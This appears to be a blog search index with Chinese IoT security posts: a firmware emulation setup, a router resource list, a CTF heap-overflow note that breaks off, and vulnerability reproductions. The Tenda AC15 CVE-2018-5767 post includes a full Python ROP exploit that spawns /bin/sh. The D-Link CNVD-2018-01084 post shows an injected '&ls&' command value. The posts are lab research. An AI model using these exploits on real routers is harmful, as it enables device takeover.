<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>IOT环境配置V2</title>
      <link href="archives/a9578bea/"/>
      <url>archives/a9578bea/</url>
      
        <content type="html"><![CDATA[<h2 id="更新环境原因"><a href="#更新环境原因" class="headerlink" title="更新环境原因"></a>更新环境原因</h2><p>概述 V1版本情况：</p><ul><li>采用一台 ubuntu 1804 配有基本 pwn 工具、qemu static v5.2 、完整版 binwalk 等。承担固件包中单个文件模拟调试任务，以及通过 qemu 模拟异架构系统实现少部分路由器系统模拟。</li><li>采用 attify v3.0 (base ubuntu 18.04) 的 <a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a> 模拟路由器系统</li></ul><p>V1 版本出现几个问题：</p><ul><li><p>首先是个小问题很容易解决，就是用 qemu uesr 模式单文件模拟调试，gdb-multiarch 有时会连不上。查了下资料、问了问师傅推测可能是 gdb 版本问题。</p><p>解决方法换个 ubuntu（16、20）就行了，qemu 都是每个系统的标配。</p></li><li><p>用 ubuntu 1804 qemu system 模式异架构系统，再在 qemu 虚拟机上运行固件。导入固件文件后，启动脚本基本在 <code>/etc/rc.d/init.d</code> </p><blockquote><p><a href="https://blog.csdn.net/cradmin/article/details/2270497">linux /etc/rc.d/目录的详解-cradmin</a></p><p><a href="https://blog.csdn.net/qq_29350001/article/details/51788937">linux /etc/rc.d/目录的详解-聚优致成</a></p></blockquote><p>这种方法能成功跑起来次数不多，但 qemu 使用桥接模式，让 qemu 虚拟机可与宿主机同一网段，方便调试抓包等。</p></li><li><p>当 ubuntu 1804 qemu system 模拟固件不成功，我就会尝试用 attify FAT 模拟，成功率到时挺高的，但由于 FAT 将 firmadyne 全部操作都整合起来，导致难以个性化修改。比较突出就是：</p><ul><li><p>自动生成启动脚本 <code>run.sh</code> 所配置的网络不能与宿主机在同一个网段，而是和 attify 在同一网段，导致如果想抓包，进行整系统测试时，只能在 attify 中完成。</p><blockquote><p>自动生成脚本在 attify 中新建一个网卡 192.168.0.2 ，链接到 qemu 虚拟机中，虚拟机网卡为 192.168.0.1 。attify 访问 192.168.0.1 即访问路由器后台</p></blockquote><p>尝试修改修改 run.sh 的启动模式，将网络模式修改为桥接，手动创建网桥、tap0 网卡等。异架构 debian 可以成功分配到宿主机网段 ip 出网，对于路由器固件就不行，原因未知。</p></li><li><p>firmadyne 是将固件制作成镜像模拟，也就是说 ssh 密码、 root 密码等等都是固件原有的。当模拟起来后，连不上 shell 就别想着查询端口，通过进程查询提供服务的文件 ……</p><p>这个问题解决方法就是放弃 FAT ，自己手工完成 firmadyne 模拟准备工作。解压固件后，将 <code>/etc/shadow</code> 替换一下，然后才制作镜像。问题在于说 attify 在进行解压时连不上 PostgreSQL ，使用 FAT 脚本就能连上。</p></li></ul></li><li><p>在原有 ubuntu 1804 上搭建 firmadyne ，可能安装脚本部分东西与原有环境有冲突装不上。firmadyne 的 docker 版本没有尝试过。</p></li></ul><p>V2 版本设想的几种方案：</p><ol><li>解决 firmadyne 模拟路由器固件桥接网络不成功问题，让路由器与宿主机在同一网段。</li><li>firmadyne docker 不过这个也是要解决网段问题……</li><li>在 ubuntu 1804 上搭 firmadyne ，放弃分配宿主机网段，直接在 ubuntu 里完成工作</li></ol><p>存一下参考文章</p><ul><li><p>解决出网问题</p><p><a href="https://wzt.ac.cn/2020/01/08/iot_brief/">firmadyne 简单使用指南 &amp; 模拟示例</a></p><p><a href="https://wzt.ac.cn/2019/09/10/QEMU-networking/">QEMU 网络配置一把梭</a></p></li><li><p>将 firmadyne 部署在云端</p><p><a href="https://zhuanlan.zhihu.com/p/110806057">Firmadyne的固件模拟环境搭建(超详细)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> firmadyne </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器资源整理</title>
      <link href="archives/e244711/"/>
      <url>archives/e244711/</url>
      
        <content type="html"><![CDATA[<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>  • 国内：<a href="http://support.dlink.com.cn:9000/">http://support.dlink.com.cn:9000/</a><br>  • 台湾/香港：<a href="http://www.dlinktw.com.tw/techsupport">http://www.dlinktw.com.tw/techsupport</a><br>  • 老旧设备资源（均为US版）：<a href="https://legacy.us.dlink.com/">https://legacy.us.dlink.com/</a></p><h2 id="CVE-仓库"><a href="#CVE-仓库" class="headerlink" title="CVE 仓库"></a>CVE 仓库</h2><p>  • <a href="https://github.com/PAGalaxyLab/VulInfo">https://github.com/PAGalaxyLab/VulInfo</a><br>  • <a href="https://github.com/GD008/vuln">https://github.com/GD008/vuln</a></p><h2 id="厂商安全公告"><a href="#厂商安全公告" class="headerlink" title="厂商安全公告"></a>厂商安全公告</h2><p>  • Dlink：<a href="http://forums.dlink.com/index.php?board=528.0">http://forums.dlink.com/index.php?board=528.0</a><br>      含有 patch 版本下载</p><h2 id="漏洞披露平台"><a href="#漏洞披露平台" class="headerlink" title="漏洞披露平台"></a>漏洞披露平台</h2><p>​    • <a href="https://www.cnvd.org.cn/flaw/list.htm">https://www.cnvd.org.cn/flaw/list.htm</a></p><h2 id="学习文档"><a href="#学习文档" class="headerlink" title="学习文档"></a>学习文档</h2><h3 id="总结性-WIKI"><a href="#总结性-WIKI" class="headerlink" title="总结性 WIKI"></a>总结性 WIKI</h3><p>  • 伏宸安全物联网安全百科：<a href="https://github.com/yaseng/iot-security-wiki">https://github.com/yaseng/iot-security-wiki</a><br>  • Tide安全Iot物联网安全wiki：<a href="https://www.yuque.com/tidesec/iot">https://www.yuque.com/tidesec/iot</a><br>  • 海特实验室IOTWIKI：<a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki</a><br>  • 绿盟智能设备安全分析手册：<a href="https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html">https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html</a></p><h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p><a href="https://www.anquanke.com/post/id/202965">MIPS 指令集 Shellcode 编写入门</a></p><h2 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h2><p>  • 各种架构 gdbserver ：<a href="https://github.com/rapid7/embedded-tools">https://github.com/rapid7/embedded-tools</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 资料 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-5767 栈溢出漏洞复现</title>
      <link href="archives/266/"/>
      <url>archives/266/</url>
      
        <content type="html"><![CDATA[<p>TENDA-AC15 型号路由器上的一个漏洞，产生原因是没有限制用户输入，使用 sscanf 直接将输入拷贝到栈上，导致栈溢出。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li><p>漏洞固件在官网没找着，去百度找到了，地址在<a href="http://www.kuaihou.com/soft/311837.html">这里</a></p><p>版本号：V15.03.1.16</p></li><li><p>qemu v5.2</p></li><li><p>Ubuntu 18.04</p></li><li><p>ida 7.5</p></li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210113356.png" alt="image-20210210113356276"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>需要配置好 qemu 桥接网络，不能就去 patch 一下 check_network 的返回值。</p><h3 id="设置桥接网络"><a href="#设置桥接网络" class="headerlink" title="设置桥接网络"></a>设置桥接网络</h3><p>安装依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure><p>修改 <code> /etc/network/interfaces</code> 网卡配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># interfaces(5) file used by ifup(8) and ifdown(8)</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"></span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet manual</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"></span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_stp off</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure><p>修改 qemu 网络脚本 <code>/etc/qemu-ifup</code> 为如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;bin&#x2F;sh</span><br><span class="line">echo &quot;Executing &#x2F;etc&#x2F;qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridged mode...&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0&quot;</span><br><span class="line">sudo &#x2F;sbin&#x2F;brctl addif br0 $1</span><br><span class="line">sleep 3</span><br></pre></td></tr></table></figure><p>给脚本加上权限，重启网络服务，如果连不上网可以重启一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod a+x /etc/qemu-ifup</span><br><span class="line">sudo /etc/init.d/networking restart</span><br><span class="line">sudo ifdown ens33</span><br><span class="line">sudo ifup br0</span><br></pre></td></tr></table></figure><p>运行程序还是报错，通过字符串定位到 <code>ConnectCfm</code> 函数，看不到函数体，应该是在其他文件定义的，这里也要 patch 改下跳转条件：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124651.png" alt="image-20210210124651672"></p><p>然后就能正常运行 httpd 服务（如果 check_network 检查是 patch 解决的，这里 ip 会有点诡异）：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210124735.png" alt="image-20210210124735721"></p><p>在 <code>R7WebsSecurityHandler</code> 开头打上断点，这个函数处理 <code>/goform/execCommand</code> 的请求：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210131807.png" alt="image-20210210131807628"></p><p>用 burpsuite 给 <code>/goform/execCommand</code> 发个包，加上 Cookie 的 password 属性，长度弄长点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;goform&#x2F;execCommand HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.211.7</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko&#x2F;20100101 Firefox&#x2F;85.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></figure><p>当检索 password 属性后将值经过 sscanf 正则过滤后存放到 v34 的字符串列表局部变量：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210140729.png" alt="image-20210210140543403"></p><p>继续运行就会报段错误退出：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210210141320.png" alt="image-20210210141320615"></p><p>用 gdb-multiarch 跟一下，查看一下地址信息。发现是在一个 if 判断中退出报错，而不是在 R7WebsSecurityHandler 退出，这样控制程序流有点复杂：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211012033.png" alt="image-20210211012033940"></p><p>根据规则如果 URL 文件后缀不是 gif 才进入 if 函数体，那么就加一个 <code>.gif</code> 让程序流直接从 R7WebsSecurityHandler 返回，这样控制起来就简单多。</p><p>然后用 cycli 生成字符串测量长度，要注意加 1 再算 padding ，得出长度为 447 。成功控制返回地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;Cookie&#39;: password&#x3D;&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211232722.png" alt="image-20210211232722219"></p><h3 id="ROP-利用链"><a href="#ROP-利用链" class="headerlink" title="ROP 利用链"></a>ROP 利用链</h3><p>arm 返回地址是在 pc 寄存器，不是在栈上。qemu 虚拟机没有随机化地址。</p><p>构造出 <code>system(&#39;/bin/sh&#39;)</code> ，<code>/bin/sh</code> 长度超过 4 字节，由于对齐要占据 8 字节空间，<code>pop r0,pc</code> gadget 不能直接用了。</p><p>先用 <code>pop r3,pc</code> 将 system 放到 r3 ，同时压入 <code> mov r0,sp;blx r3</code> ，这时 sp 寄存器指向 /bin/sh ，将参数地址移动到 r0 ，然后跳转 r3 地址。</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234133.png" alt="image-20210211234133733"></p><p>qemu 需要加上 -strace 查看调用：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210211234504.png" alt="image-20210211153837937"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;192.168.211.7&quot;</span></span><br><span class="line">command = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://&#123;:s&#125;/goform/exeCommand&quot;</span>.<span class="built_in">format</span>(ip)</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;password=&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaSKYEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.gifbbbbzzzz&quot;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x3fde6000</span></span><br><span class="line">pop_r3_pc = struct.pack(<span class="string">&quot;&lt; I&quot;</span>,<span class="number">0x00018298</span>+libc)<span class="comment">#pop r3 pc</span></span><br><span class="line">mov_r0_sp_blx_r3 = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x00040cb8</span> + libc)<span class="comment"># mov r0 sp; blx r3</span></span><br><span class="line">system = struct.pack(<span class="string">&quot;&lt; I&quot;</span>, <span class="number">0x0005A270</span>+libc)</span><br><span class="line">command = command.encode()<span class="comment"># &#x27;byte&#x27;</span></span><br><span class="line">password = <span class="string">b&quot;A&quot;</span> * <span class="number">444</span>+<span class="string">b&quot;.gif&quot;</span>+pop_r3_pc+system+mov_r0_sp_blx_r3+command</span><br><span class="line">headers[<span class="string">&#x27;Cookie&#x27;</span>]=<span class="string">b&quot;password=&quot;</span>+password</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = requests.get(url,headers=headers,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/wireless/166869.html">https://www.freebuf.com/articles/wireless/166869.html</a></p><p><a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">https://wzt.ac.cn/2019/03/19/CVE-2018-5767/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tenda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-2018-01084 远程代码执行复现</title>
      <link href="archives/224/"/>
      <url>archives/224/</url>
      
        <content type="html"><![CDATA[<p>Dlink DIR 615/645/815 路由上远程代码执行漏洞。漏洞存在于 <code>/htdocs/cgibin</code> 二进制文件中，原因是 <code>service.cgi</code> 中未经过滤就将用户输入拼接到命令中。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>漏洞固件 <a href="https://tsd.dlink.com.tw/ddgo">Firmware:DIR-645_A1_FW: v1.02b08 (for WW)</a> （tw官网选择 DIR-645 第一个文件）<br>版本号为 v1.02（v1.03完成修复）</li><li>qemu v5.2</li><li>Ubuntu 18.04</li><li>ida 7.5（能搞 mips 反编译工具都行）</li></ul><p>直接运行如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215850.png" alt="image-20210209215850264"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>strrchr</code> 匹配出 <code>/</code> 后面的参数后，<code>strcmp</code> 匹配参数进入各个服务函数：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209215638.png" alt="image-20210209215637987"></p><p>定位到 <code>servicecgi_main</code> 。<code>getenv</code> 提取参数依据两种请求方式分别给 v2 赋值，不匹配或为空则退出；提取请求方式后，将参数传入 <code>cgibin_parse_request</code> 解析 http 请求：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209220241.png" alt="image-20210209220241088"></p><p>到里面分别提取<code>REQUEST_URI</code>、 <code>CONTENT_TYPE</code>、<code>CONTENT_LENGTH</code>  ，</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221145.png" alt="image-20210209221145009"></p><p>当解析无误后返回上层函数，然后进入权限认证：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221306.png" alt="image-20210209221306768"></p><p>在这个认证函数内部的函数 <code>sess_get_uid</code> ，可以看到是从 HTTP_COOKIE 里面获取 uid 判断：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209221716.png" alt="image-20210209221716723"></p><p>进入 <code> sub_40A950</code> 将 URL ？ 后面部分与关键词匹配，如果一致就开始准备进入拼接命令字符串：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222749.png" alt="image-20210209222749033"></p><p><code>lxmldbc_system</code> 里面将预制指令和 URL 里面参数进行拼接：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209222937.png" alt="image-20210209222937398"></p><p>Event 命令字符串为：<code>&quot;event %s &gt; /dev/null&quot;</code> ，中间我们可以加上任意指令比如：<code>&quot;event &amp;ls&amp; &gt; /dev/null&quot;</code></p><p>开始测试前，权限认证那里由于少文件等，要将那个函数 patch 改一下。把跳转 session 改掉不然会卡一段时间，因为仿真没有 <code>/var/session</code> 文件；v1 的复制改为 1 就是代表有权限：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232026.png" alt="image-20210209232026784"></p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231657.png" alt="image-20210209231657216"></p><p>测试一下，启动命令：</p><blockquote><p>-0：传入第一个参数，进入 servicecgi_main</p><p>-E：选项传入自定义的环境变量</p><p>-strace：显示具体信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p>启动后，报错解析不了：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209230233.png" alt="image-20210209230233246"></p><p>加上调试解析函数看都是解析正确，单步调试就发现是成功解析后执行 retrun 函数并没有返回到上一层，而是继续往下执行 95 行的 retrun v9 这是的 v9 为 -1 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209231306.png" alt="image-20210209231306395"></p><p>cataLpa 师傅复现文章也出现相同情况，推测可能是 qemu 仿真问题。这里可以直接改寄存器或者 patch 一下。</p><p>再次启动，这次就正常回显，但是没有运行附加进去的指令：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209232205.png" alt="image-20210209232205679"></p><p>附加上 <code>-strace</code> 查看一下详细信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel -g 1234 -strace \</span><br><span class="line">-0 &quot;service.cgi&quot; \</span><br><span class="line">-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">-E CONTENT_LENGTH=10 \</span><br><span class="line">-E REQUEST_URI=&quot;service.cgi?EVENT=%26ls%26&quot; \</span><br><span class="line">-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">-E HTTP_COOKIE=&quot;uid=skye231&quot; \</span><br><span class="line">./htdocs/cgibin </span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210209233118.png" alt="image-20210209233118432"></p><p>指令已经附加上去，应该是 qemu 环境问题运行不了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/">https://wzt.ac.cn/2019/09/05/CNVD-2018-01084/</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>沙盒堆溢出学习</title>
      <link href="archives/233/"/>
      <url>archives/233/</url>
      
        <content type="html"><![CDATA[<p>在复现 SWPUCTF2020 jailbreak 遇到打开沙盒堆溢出题目，这条题目实际上还有 chroot 逃逸，这个先放后面。沙盒堆溢出利用方法关键是 <code>setcontext()</code> ，以这个点搜寻其他同类题目。年前的高校战役 lgd ，七月份 DASCTF bigbear 。</p><h2 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdlib/setcontext.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setcontext</span><span class="params">(<span class="keyword">const</span> <span class="keyword">ucontext_t</span> *ucp)</span></span>&#123;</span><br><span class="line">  ……</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其作用是用户上下文的设置，所以我们在可以小范围控制执行流，已知 libc_base 